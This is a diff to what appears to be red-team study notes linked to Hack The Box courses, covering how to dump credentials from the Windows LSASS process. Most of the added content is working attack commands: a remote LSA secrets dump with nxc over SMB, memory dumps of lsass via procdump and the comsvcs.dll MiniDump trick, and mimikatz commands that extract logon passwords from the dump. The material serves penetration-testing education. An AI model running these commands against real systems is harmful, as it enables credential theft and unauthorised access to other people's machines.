@@ -245,6 +245,7 @@ mimikatz# vault::cred
 #### Dump Credentials From LSASS Process
 
 [![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+[![windows_privilege_escalation](../../../cybersecurity/_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
 
 The LSASS process that contains the DPAPI masterkey for the logged user. It can be used to decrypt credentials for applications that use it. It also contains tickets, and [wDIGEST](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-digest-authentication) cleartext credentials.
 
@@ -255,24 +256,38 @@ mimikatz# lsadump::lsa /patch
 mimikatz# sekurlsa::dpapi
 ```
 
+* **Dump and Analysis** using [nxc](/cybersecurity/red-team/tools/cracking/auth/nxc.md)
+
+```ps
+$ nxc smb IP --local-auth -u xxx -p yyy --lsa # dump secrets
+```
+
 * **Dump LSA Process Memory** <small>(Admin Shell Required/No Admin for TM?)</small>
 
 ```shell!
-$ tasklist /svc | findstr "lsa"
+PS> tasklist /svc | findstr "lsa"
 lsass.exe          4242
-$ Get-Process lsass | Select Id
+PS> Get-Process lsass | Select Id
   Id
   --
   4242
-$ rundll32 C:\windows\system32\comsvcs.dll, MiniDump 4242 C:\lsass.dmp full
+PS> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 4242 C:\lsass.dmp full
 <detected by antivirus>
 ```
 
 ```ps
-$ nxc smb IP --local-auth -u xxx -p yyy --lsa # remote dump
+PS> .\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+<admin required>
 ```
 
 Lastly, you can also open the task manager, right-click on the LSAP process and select 'Create dump file.'
+
+* **Analyzing LSA Process Dump** on Windows using [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md)
+
+```shell!
+mimikatz# sekurlsa::minidump ./lsass.dmp # load
+mimikatz# sekurlsa::logonpasswords
+```
 
 * **Analyzing LSA Process Dump** on Linux using [pypykatz](/cybersecurity/red-team/tools/utilities/creds/pypykatz.md)
 
